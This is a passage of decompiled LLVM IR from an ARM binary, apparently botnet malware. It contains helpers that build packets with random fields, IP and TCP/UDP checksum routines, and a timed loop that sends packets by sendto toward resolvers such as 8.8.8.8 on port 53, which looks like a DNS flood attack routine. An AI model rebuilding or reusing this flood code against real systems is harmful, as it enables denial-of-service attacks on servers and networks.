  store i32 %v1_db74, i32* @r5, align 4
  store i32 %v2_d920, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_db80 = load i32, i32* @r4, align 4
  %v2_db80 = add i32 %v0_db80, %v2_d920
  store i32 %v2_db80, i32* %r2.global-to-local, align 4
  %v9_db84 = icmp eq i32 %v1_db74, %arg2
  store i1 %v9_db84, i1* %cpsr_z.global-to-local, align 1
  %v3_db88 = add i32 %v2_db80, 4
  %v4_db88 = inttoptr i32 %v3_db88 to i16*
  store i16 256, i16* %v4_db88, align 2
  %v0_db8c = load i32, i32* @lr, align 4
  %v1_db8c = trunc i32 %v0_db8c to i16
  %v2_db8c = load i32, i32* %r2.global-to-local, align 4
  %v3_db8c = add i32 %v2_db8c, 2
  %v4_db8c = inttoptr i32 %v3_db8c to i16*
  store i16 %v1_db8c, i16* %v4_db8c, align 2
  %v0_db90 = load i32, i32* @r5, align 4
  store i32 %v0_db90, i32* %stack_var_-44, align 4
  %v8_db94 = icmp slt i32 %v1_db74, %arg2
  br i1 %v8_db94, label %dec_label_pc_da48, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db68, %dec_label_pc_dd0c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 %v2_d9a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d9a8, label %dec_label_pc_dd0c, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %dec_label_pc_db98
  store i32 %v2_d920, i32* %r1.global-to-local, align 4
  %v1_dbb0 = load i32, i32* @sl, align 4
  %v2_dbb0 = add i32 %v1_dbb0, %v2_d920
  store i32 %v2_dbb0, i32* %r3.global-to-local, align 4
  %v1_dbb4 = add i32 %v2_dbb0, 47
  store i32 %v1_dbb4, i32* @fp, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_dbbc = add i32 %v2_dbb0, 27
  store i32 %v1_dbbc, i32* @sb, align 4
  %v3_dc98 = icmp eq i32 %v3_d998, 65535
  %v3_dbc8 = icmp eq i32 %v3_d99c, 65535
  br label %dec_label_pc_dc84

dec_label_pc_dbc4:                                ; preds = %dec_label_pc_dc84
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  store i1 %v3_dbc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dbc8, label %dec_label_pc_dcc0, label %dec_label_pc_dbd0

dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge, %dec_label_pc_dbc4
  %v1_dbd4 = phi i32 [ %v1_dbd4.pre, %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge ], [ 65535, %dec_label_pc_dbc4 ]
  store i32 %v3_d9a0, i32* @lr, align 4
  %v9_dbd4 = icmp eq i32 %v3_d9a0, %v1_dbd4
  store i1 %v9_dbd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbd4, label %dec_label_pc_dcd4, label %dec_label_pc_dbdc

dec_label_pc_dbdc:                                ; preds = %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge, %dec_label_pc_dbd0
  %v1_dbe0 = phi i32 [ %v1_dbe0.pre, %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge ], [ %v1_dbd4, %dec_label_pc_dbd0 ]
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v9_dbe0 = icmp eq i32 %v3_d9a4, %v1_dbe0
  store i1 %v9_dbe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dbe0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc, %dec_label_pc_dce8
  %v0_dbe8 = load i32, i32* @r7, align 4
  store i32 %v0_dbe8, i32* %r0.global-to-local, align 4
  %v0_dbec = load i32, i32* @sl, align 4
  store i32 %v0_dbec, i32* %r1.global-to-local, align 4
  %v2_dbf0 = call i32 @rand_alphastr(i32 %v0_dbe8, i32 %v0_dbec)
  %v0_dbf4 = load i32, i32* @r8, align 4
  %v1_dbf4 = trunc i32 %v0_dbf4 to i8
  %v2_dbf4 = load i32, i32* @r7, align 4
  %v3_dbf4 = load i32, i32* @sl, align 4
  %v4_dbf4 = add i32 %v3_dbf4, %v2_dbf4
  %v5_dbf4 = inttoptr i32 %v4_dbf4 to i8*
  store i8 %v1_dbf4, i8* %v5_dbf4, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_dbfc = load i32, i32* @r8, align 4
  %v1_dbfc = trunc i32 %v0_dbfc to i16
  %v2_dbfc = load i32, i32* @r4, align 4
  %v3_dbfc = add i32 %v2_dbfc, 10
  %v4_dbfc = inttoptr i32 %v3_dbfc to i16*
  store i16 %v1_dbfc, i16* %v4_dbfc, align 2
  %v0_dc00 = load i32, i32* @r4, align 4
  store i32 %v0_dc00, i32* @r0, align 4
  %v2_dc04 = call i32 @checksum_generic(i32 %v0_dc00, i32 20)
  %v3_dc04 = trunc i32 %v2_dc04 to i16
  store i32 %v2_dc04, i32* %r0.global-to-local, align 4
  %v3_dc08 = load i32, i32* @r4, align 4
  %v4_dc08 = add i32 %v3_dc08, 10
  %v5_dc08 = inttoptr i32 %v4_dc08 to i16*
  store i16 %v3_dc04, i16* %v5_dc08, align 2
  %v0_dc0c = load i32, i32* @r6, align 4
  store i32 %v0_dc0c, i32* @r1, align 4
  %v1_dc10 = add i32 %v0_dc0c, 4
  %v2_dc10 = inttoptr i32 %v1_dc10 to i16*
  %v3_dc10 = load i16, i16* %v2_dc10, align 2
  %v4_dc10 = zext i16 %v3_dc10 to i32
  store i32 %v4_dc10, i32* %r2.global-to-local, align 4
  %v0_dc14 = load i32, i32* @r8, align 4
  %v1_dc14 = trunc i32 %v0_dc14 to i16
  %v3_dc14 = add i32 %v0_dc0c, 6
  %v4_dc14 = inttoptr i32 %v3_dc14 to i16*
  store i16 %v1_dc14, i16* %v4_dc14, align 2
  %v0_dc18 = load i32, i32* @sb, align 4
  store i32 %v0_dc18, i32* %r3.global-to-local, align 4
  %v0_dc1c = load i32, i32* @r4, align 4
  store i32 %v0_dc1c, i32* %r0.global-to-local, align 4
  %v4_dc20 = call i32 @checksum_tcpudp(i32 %v0_dc1c, i32 %v0_dc0c, i32 %v4_dc10, i32 %v0_dc18)
  %v5_dc20 = trunc i32 %v4_dc20 to i16
  store i32 %v4_dc20, i32* %r0.global-to-local, align 4
  %v3_dc24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_dc24, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_dc2c = mul i32 %v3_dc24, 32
  store i32 %v3_dc2c, i32* %ip.global-to-local, align 4
  %v3_dc30 = load i32, i32* @r6, align 4
  %v4_dc30 = add i32 %v3_dc30, 6
  %v5_dc30 = inttoptr i32 %v4_dc30 to i16*
  store i16 %v5_dc20, i16* %v5_dc30, align 2
  store i32 %stack_var_-2184.0, i32* %r2.global-to-local, align 4
  %v0_dc38 = load i32, i32* @r6, align 4
  %v1_dc38 = add i32 %v0_dc38, 2
  %v2_dc38 = inttoptr i32 %v1_dc38 to i16*
  %v3_dc38 = load i16, i16* %v2_dc38, align 2
  %v4_dc38 = zext i16 %v3_dc38 to i32
  store i32 %v4_dc38, i32* @r6, align 4
  %v0_dc3c = load i32, i32* %ip.global-to-local, align 4
  %v1_dc3c = load i32, i32* %r3.global-to-local, align 4
  %tmp135 = mul i32 %v1_dc3c, -8
  %v5_dc3c = add i32 %v0_dc3c, %tmp135
  %v1_dc40 = load i32, i32* %r1.global-to-local, align 4
  %v2_dc40 = add i32 %v1_dc40, %v5_dc3c
  store i32 %v2_dc40, i32* %ip.global-to-local, align 4
  %v2_dc44 = add i32 %v2_dc40, 4
  %v3_dc44 = inttoptr i32 %v2_dc44 to i32*
  store i32 %stack_var_-2184.0, i32* %v3_dc44, align 4
  %v0_dc48 = load i32, i32* @r6, align 4
  %v1_dc48 = trunc i32 %v0_dc48 to i16
  %v2_dc48 = load i32, i32* %ip.global-to-local, align 4
  %v3_dc48 = add i32 %v2_dc48, 2
  %v4_dc48 = inttoptr i32 %v3_dc48 to i16*
  store i16 %v1_dc48, i16* %v4_dc48, align 2
  %v0_dc4c = load i32, i32* @r4, align 4
  store i32 %v0_dc4c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v0_dc58 = load i32, i32* @fp, align 4
  store i32 %v0_dc58, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_dc60 = load i32, i32* %ip.global-to-local, align 4
  %v6_dc68 = call i32 @__libc_sendto(i32 %v3_d934, i32 %v0_dc4c, i32 %v0_dc58, i32 16384, i32 %v0_dc60, i32 16)
  %v3_dc6c = load i32, i32* %stack_var_-44, align 4
  %v1_dc70 = add i32 %v3_dc6c, 1
  store i32 %v1_dc70, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_dc78 = icmp eq i32 %v1_dc70, %arg2
  store i1 %v9_dc78, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dc70, i32* %stack_var_-44, align 4
  %v7_dc80 = icmp slt i32 %v1_dc70, %arg2
  br i1 %v7_dc80, label %dec_label_pc_dc84, label %dec_label_pc_dd0c

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dbac
  %v1_dc90 = phi i32 [ %v1_dc70, %dec_label_pc_dbe8 ], [ 0, %dec_label_pc_dbac ]
  store i32 %v2_d6e4, i32* %r2.global-to-local, align 4
  store i32 %v3_d998, i32* %r3.global-to-local, align 4
  %v4_dc90 = mul i32 %v1_dc90, 4
  %v5_dc90 = add i32 %v4_dc90, %v2_d6e4
  %v6_dc90 = inttoptr i32 %v5_dc90 to i32*
  %v7_dc90 = load i32, i32* %v6_dc90, align 4
  store i32 %v7_dc90, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_dc98, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* @r8, align 4
  %v1_dca0 = add i32 %v7_dc90, 20
  store i32 %v1_dca0, i32* @r6, align 4
  %v1_dca4 = add i32 %v7_dc90, 41
  store i32 %v1_dca4, i32* @r7, align 4
  br i1 %v3_dc98, label %dec_label_pc_dcac, label %dec_label_pc_dbc4

dec_label_pc_dcac:                                ; preds = %dec_label_pc_dc84
  %v0_dcac = call i32 @rand_next()
  %v1_dcac = trunc i32 %v0_dcac to i16
  store i32 %v0_dcac, i32* %r0.global-to-local, align 4
  store i32 %v3_d99c, i32* %ip.global-to-local, align 4
  %v1_dcb4 = load i32, i32* @r5, align 4
  %v9_dcb4 = icmp eq i32 %v3_d99c, %v1_dcb4
  store i1 %v9_dcb4, i1* %cpsr_z.global-to-local, align 1
  %v3_dcb8 = load i32, i32* @r4, align 4
  %v4_dcb8 = add i32 %v3_dcb8, 4
  %v5_dcb8 = inttoptr i32 %v4_dcb8 to i16*
  store i16 %v1_dcac, i16* %v5_dcb8, align 2
  br i1 %v9_dcb4, label %dec_label_pc_dcc0, label %dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge

dec_label_pc_dcac.dec_label_pc_dbd0_crit_edge:    ; preds = %dec_label_pc_dcac
  %v1_dbd4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbd0

dec_label_pc_dcc0:                                ; preds = %dec_label_pc_dcac, %dec_label_pc_dbc4
  %v0_dcc0 = call i32 @rand_next()
  %v1_dcc0 = trunc i32 %v0_dcc0 to i16
  store i32 %v0_dcc0, i32* %r0.global-to-local, align 4
  store i32 %v3_d9a0, i32* @lr, align 4
  %v1_dcc8 = load i32, i32* @r5, align 4
  %v9_dcc8 = icmp eq i32 %v3_d9a0, %v1_dcc8
  store i1 %v9_dcc8, i1* %cpsr_z.global-to-local, align 1
  %v3_dccc = load i32, i32* @r4, align 4
  %v4_dccc = add i32 %v3_dccc, 20
  %v5_dccc = inttoptr i32 %v4_dccc to i16*
  store i16 %v1_dcc0, i16* %v5_dccc, align 2
  br i1 %v9_dcc8, label %dec_label_pc_dcd4, label %dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge

dec_label_pc_dcc0.dec_label_pc_dbdc_crit_edge:    ; preds = %dec_label_pc_dcc0
  %v1_dbe0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dbdc

dec_label_pc_dcd4:                                ; preds = %dec_label_pc_dcc0, %dec_label_pc_dbd0
  %v0_dcd4 = call i32 @rand_next()
  %v1_dcd4 = trunc i32 %v0_dcd4 to i16
  %v3_dcd8 = load i32, i32* @r6, align 4
  %v4_dcd8 = add i32 %v3_dcd8, 2
  %v5_dcd8 = inttoptr i32 %v4_dcd8 to i16*
  store i16 %v1_dcd4, i16* %v5_dcd8, align 2
  store i32 %v3_d9a4, i32* %r0.global-to-local, align 4
  %v1_dce0 = load i32, i32* @r5, align 4
  %v9_dce0 = icmp eq i32 %v3_d9a4, %v1_dce0
  store i1 %v9_dce0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dce0, label %dec_label_pc_dce8, label %dec_label_pc_dbe8

dec_label_pc_dce8:                                ; preds = %dec_label_pc_dcd4, %dec_label_pc_dbdc
  %v0_dce8 = call i32 @rand_next()
  %v1_dce8 = trunc i32 %v0_dce8 to i16
  store i32 %v0_dce8, i32* %r0.global-to-local, align 4
  %v3_dcec = load i32, i32* @r4, align 4
  %v4_dcec = add i32 %v3_dcec, 28
  %v5_dcec = inttoptr i32 %v4_dcec to i16*
  store i16 %v1_dce8, i16* %v5_dcec, align 2
  br label %dec_label_pc_dbe8

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_d944
  store i32 %v3_d934, i32* %r0.global-to-local, align 4
  %v1_dcf8 = call i32 @__GI___libc_close(i32 %v3_d934)
  store i32 %v1_dcf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dd0c, %dec_label_pc_d91c, %dec_label_pc_d904, %dec_label_pc_dcf4
  %v1_dd08 = phi i32 [ %v3_d934, %dec_label_pc_d91c ], [ %v2_d910, %dec_label_pc_d904 ], [ %v1_dcf8, %dec_label_pc_dcf4 ], [ %v2_dd10, %dec_label_pc_dd0c ]
  store i32 %v18_d6b4, i32* %sb.global-to-local, align 4
  store i32 %v27_d6b4, i32* %lr.global-to-local, align 4
  ret i32 %v1_dd08

dec_label_pc_dd0c.critedge:                       ; preds = %dec_label_pc_d96c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_dd0c

dec_label_pc_dd0c:                                ; preds = %dec_label_pc_dbe8, %dec_label_pc_dd0c.critedge, %dec_label_pc_db98
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_dd10 = call i32 @__GI_time(i32* null)
  store i32 %v2_dd10, i32* %r0.global-to-local, align 4
  %v9_dd18 = icmp eq i32 %v2_d910, %v2_dd10
  store i1 %v9_dd18, i1* %cpsr_z.global-to-local, align 1
  %v6_dd1c = icmp slt i32 %v2_d910, %v2_dd10
  br i1 %v6_dd1c, label %dec_label_pc_dcfc, label %dec_label_pc_db98

dec_label_pc_dd24:                                ; preds = %dec_label_pc_d8bc, %bb113
  %v0_d8c4.lcssa = phi i32 [ %v1_d890, %dec_label_pc_d8bc ], [ %v0_d8c4, %bb113 ]
  %v2_dd28 = sub i32 %v0_d8c4.lcssa, %v0_d86c
  store i32 %v2_dd28, i32* @r4, align 4
  %v2_dd2c = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_d880, i32* %r1.global-to-local, align 4
  store i32 %v2_dd2c, i32* %r0.global-to-local, align 4
  store i32 %v2_dd28, i32* %r2.global-to-local, align 4
  %v3_dd3c = call i32 @util_memcpy(i32 %v2_dd2c, i32 %v2_d880, i32 %v2_dd28)
  %v2_dd40 = ptrtoint i32* %stack_var_-40 to i32
  %v1_dd44 = load i32, i32* @r4, align 4
  %v2_dd44 = add i32 %v1_dd44, %v2_dd40
  store i32 %v2_dd44, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dd2c, i32* @r0, align 4
  %v3_dd50 = add i32 %v2_dd44, -36
  %v4_dd50 = inttoptr i32 %v3_dd50 to i8*
  store i8 0, i8* %v4_dd50, align 1
  %v1_dd54 = call i32 @inet_addr(i32 %v2_dd2c)
  store i32 %v1_dd54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd60:                                ; preds = %dec_label_pc_d8d0
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd70:                                ; preds = %dec_label_pc_d8d0
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d904

dec_label_pc_dd84:                                ; preds = %dec_label_pc_d8d0
  store i32 707416650, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_d904

; uselistorder directives
  uselistorder i32 %v1_dd54, { 1, 0 }
  uselistorder i32 %v2_dd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v2_dd28, { 1, 0, 2 }
  uselistorder i32 %v2_dd10, { 1, 2, 3, 0 }
  uselistorder i32 %v0_dce8, { 1, 0 }
  uselistorder i32 %v0_dcc0, { 1, 0 }
  uselistorder i32 %v0_dcac, { 1, 0 }
  uselistorder i32 %v7_dc90, { 1, 0, 2 }
  uselistorder i32 %v1_dc70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v4_dc20, { 1, 0 }
  uselistorder i32 %v0_dc0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_dc04, { 1, 0 }
  uselistorder i1 %v3_dbc8, { 1, 0 }
  uselistorder i1 %v3_dc98, { 1, 0 }
  uselistorder i32 %v1_db50.pre, { 1, 0 }
  uselistorder i32 %v2_db48, { 1, 0 }
  uselistorder i32 %v2_db4817, { 1, 0 }
  uselistorder i32 %v0_db5419, { 1, 0 }
  uselistorder i32 %v1_db40, { 1, 0 }
  uselistorder i32 %v3_da2c, { 1, 0 }
  uselistorder i32 %v3_da18, { 1, 0 }
  uselistorder i32 %v3_d9d8, { 1, 0 }
  uselistorder i32 %v1_d9ac, { 1, 0 }
  uselistorder i32 %v3_d9a0, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_d99c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_d964, { 1, 0 }
  uselistorder i1 %v7_d938, { 1, 0 }
  uselistorder i32 %v3_d934, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_d920, { 0, 13, 1, 8, 3, 6, 7, 5, 9, 11, 10, 4, 12, 2 }
  uselistorder i32 %v2_d910, { 2, 1, 0, 3 }
  uselistorder i32 %v0_d90c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-2184.0, { 0, 3, 2, 1 }
  uselistorder i32 %v1_d8d4, { 1, 0 }
  uselistorder i32 %v0_d8d0, { 1, 0 }
  uselistorder i32 %v1_d8c4, { 1, 2, 0 }
  uselistorder i1 %v7_d8b0, { 1, 0 }
  uselistorder i32 %v1_d8ac, { 1, 0, 2 }
  uselistorder i1 %v8_d8a4, { 1, 0 }
  uselistorder i1 %v7_d8a0, { 1, 0 }
  uselistorder i32 %v1_d894, { 1, 0 }
  uselistorder i8 %v2_d888, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d88c, { 1, 0 }
  uselistorder i32 %v0_d8ac, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d880, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d87c, { 1, 0, 2 }
  uselistorder i32 %v0_d874, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d86c, { 1, 0 }
  uselistorder i32 %v0_d86c, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_d810, { 1, 0, 2, 3 }
  uselistorder i32 %v6_d7b0, { 2, 0, 1, 3 }
  uselistorder i32 %v6_d794, { 0, 2, 1 }
  uselistorder i32 %v6_d77c, { 1, 0, 2 }
  uselistorder i32 %v1_d764, { 1, 0 }
  uselistorder i32 %v7_d720, { 1, 0, 2 }
  uselistorder i32 %v1_d708, { 1, 0 }
  uselistorder i32 %v6_d6fc, { 1, 0 }
  uselistorder i32 %v2_d6e4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 2, 10, 7, 8, 9, 11, 12, 13, 3, 14, 4, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 4, 5, 6, 7, 8, 9, 10, 2, 12, 3, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 45, 44, 46, 48, 47, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 8, 6, 9, 7, 10, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 22, 21, 23, 24, 25, 33, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 42, 41, 43, 44, 45, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1, 13, 14, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 41, { 4, 5, 6, 0, 1, 7, 2, 8, 3, 9 }
  uselistorder i8 17, { 1, 2, 0 }
  uselistorder i8 -16, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 53, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %arg2, { 3, 4, 6, 7, 0, 1, 5, 2, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_dd0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dcfc, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_dbe8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_db98, { 1, 0 }
  uselistorder label %dec_label_pc_db68, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %dec_label_pc_d8c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d8bc, { 1, 0 }
  uselistorder label %dec_label_pc_d8b0, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_ddbc, label %dec_label_pc_dda4

dec_label_pc_dda4:                                ; preds = %entry
  %v0_ddac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_dda8

dec_label_pc_dda8:                                ; preds = %dec_label_pc_dda8, %dec_label_pc_dda4
  %v0_ddb4 = phi i32 [ %v2_ddb4, %dec_label_pc_dda8 ], [ 0, %dec_label_pc_dda4 ]
  %v0_ddac = phi i32 [ %v5_ddac, %dec_label_pc_dda8 ], [ %v0_ddac.pre, %dec_label_pc_dda4 ]
  %v0_dda8 = phi i32 [ %v1_dda8, %dec_label_pc_dda8 ], [ %arg1, %dec_label_pc_dda4 ]
  %v1_dda8 = add i32 %v0_dda8, -2
  %v1_ddac = inttoptr i32 %v0_ddac to i16*
  %v2_ddac = load i16, i16* %v1_ddac, align 2
  %v3_ddac = zext i16 %v2_ddac to i32
  %v5_ddac = add i32 %v0_ddac, -2
  store i32 %v5_ddac, i32* @r0, align 4
  %v2_ddb4 = add i32 %v3_ddac, %v0_ddb4
  %v1_dda8.cmp = icmp ugt i32 %v1_dda8, 1
  br i1 %v1_dda8.cmp, label %dec_label_pc_dda8, label %dec_label_pc_ddbc.loopexit

dec_label_pc_ddbc.loopexit:                       ; preds = %dec_label_pc_dda8
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %entry, %dec_label_pc_ddbc.loopexit
  %v1_ddc4 = phi i32 [ %v2_ddb4, %dec_label_pc_ddbc.loopexit ], [ 0, %entry ]
  %v0_ddbc = phi i32 [ %v1_dda8, %dec_label_pc_ddbc.loopexit ], [ %arg1, %entry ]
  %v7_ddbc = icmp eq i32 %v0_ddbc, 1
  br i1 %v7_ddbc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_ddbc
  %v1_ddc0 = load i32, i32* @r0, align 4
  %v2_ddc0 = inttoptr i32 %v1_ddc0 to i8*
  %v3_ddc0 = load i8, i8* %v2_ddc0, align 1
  %v4_ddc0 = zext i8 %v3_ddc0 to i32
  %v3_ddc4 = add i32 %v1_ddc4, %v4_ddc0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ddbc, %bb
  %v0_ddc8 = phi i32 [ %v1_ddc4, %dec_label_pc_ddbc ], [ %v3_ddc4, %bb ]
  %v3_ddcc = urem i32 %v0_ddc8, 65536
  %v4_ddd0 = udiv i32 %v0_ddc8, 65536
  %v5_ddd0 = add nuw nsw i32 %v4_ddd0, %v3_ddcc
  %v4_ddd4 = udiv i32 %v5_ddd0, 65536
  %v5_ddd4 = add nuw nsw i32 %v4_ddd4, %v5_ddd0
  %v1_ddd8 = urem i32 %v5_ddd4, 65536
  %v3_dde0 = xor i32 %v1_ddd8, 65535
  ret i32 %v3_dde0

; uselistorder directives
  uselistorder i32 %v5_ddd0, { 1, 0 }
  uselistorder i32 %v5_ddac, { 1, 0 }
  uselistorder i32 %v1_dda8, { 1, 0, 2 }
  uselistorder i32 %v0_ddac, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_ddbc, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_ddf8 = add i32 %arg1, 12
  %v2_ddf8 = inttoptr i32 %v1_ddf8 to i32*
  %v3_ddf8 = load i32, i32* %v2_ddf8, align 4
  %v1_ddfc = add i32 %arg1, 16
  %v2_ddfc = inttoptr i32 %v1_ddfc to i32*
  %v3_ddfc = load i32, i32* %v2_ddfc, align 4
  %v7_de00 = icmp sgt i32 %arg3, 1
  br i1 %v7_de00, label %dec_label_pc_de0c.preheader, label %dec_label_pc_de20

dec_label_pc_de0c.preheader:                      ; preds = %entry
  %v0_de10.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_de0c

dec_label_pc_de0c:                                ; preds = %dec_label_pc_de0c.preheader, %dec_label_pc_de0c
  %v0_de18 = phi i32 [ 0, %dec_label_pc_de0c.preheader ], [ %v2_de18, %dec_label_pc_de0c ]
  %v0_de10 = phi i32 [ %v0_de10.pre, %dec_label_pc_de0c.preheader ], [ %v5_de10, %dec_label_pc_de0c ]
  %v0_de0c = phi i32 [ %arg3, %dec_label_pc_de0c.preheader ], [ %v1_de0c, %dec_label_pc_de0c ]
  %v1_de0c = add nsw i32 %v0_de0c, -2
  %v1_de10 = inttoptr i32 %v0_de10 to i16*
  %v2_de10 = load i16, i16* %v1_de10, align 2
  %v3_de10 = zext i16 %v2_de10 to i32
  %v5_de10 = add i32 %v0_de10, -2
  store i32 %v5_de10, i32* @r1, align 4
  %v2_de18 = add i32 %v3_de10, %v0_de18
  %v8_de1c = icmp sgt i32 %v1_de0c, 1
  br i1 %v8_de1c, label %dec_label_pc_de0c, label %dec_label_pc_de20.loopexit

dec_label_pc_de20.loopexit:                       ; preds = %dec_label_pc_de0c
  br label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %dec_label_pc_de20.loopexit, %entry
  %v1_de2c = phi i32 [ %v2_de18, %dec_label_pc_de20.loopexit ], [ 0, %entry ]
  %v0_de20 = phi i32 [ %v1_de0c, %dec_label_pc_de20.loopexit ], [ %arg3, %entry ]
  %v7_de20 = icmp eq i32 %v0_de20, 1
  br i1 %v7_de20, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_de20
  br label %bb19

bb:                                               ; preds = %dec_label_pc_de20
  %v1_de24 = load i32, i32* @r1, align 4
  %v2_de24 = inttoptr i32 %v1_de24 to i8*
  %v3_de24 = load i8, i8* %v2_de24, align 1
  %v4_de24 = zext i8 %v3_de24 to i32
  %v3_de2c = add i32 %v4_de24, %v1_de2c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
